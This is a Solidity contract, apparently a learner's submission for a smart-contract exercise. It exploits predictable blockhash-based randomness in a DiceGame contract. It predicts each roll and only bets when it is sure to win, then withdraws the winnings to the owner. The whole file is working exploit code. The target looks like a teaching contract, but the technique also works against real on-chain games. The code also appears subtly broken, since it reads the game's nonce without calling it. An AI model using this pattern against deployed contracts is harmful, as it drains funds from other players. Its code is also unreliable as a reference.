pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    event Roll(address indexed player, uint256 amount, uint256 roll);

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        require(_addr != address(0), "Invalid address");
        require(address(this).balance >= _amount, "Insufficient balance in the contract");
        
        (bool success, ) = _addr.call{value: _amount}("");
        require(success, "Transfer failed");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() external onlyOwner {
        require(address(this).balance >= 0.002 ether, "Insufficient balance in the contract");
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce));
        uint256 roll = uint256(hash) % 16;

        if (roll <= 5) {
            diceGame.rollTheDice{value: 0.002 ether}();
            emit Roll(msg.sender, 0.002 ether, roll);
        } else {
            revert("Dice roll greater than 5");
        }
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}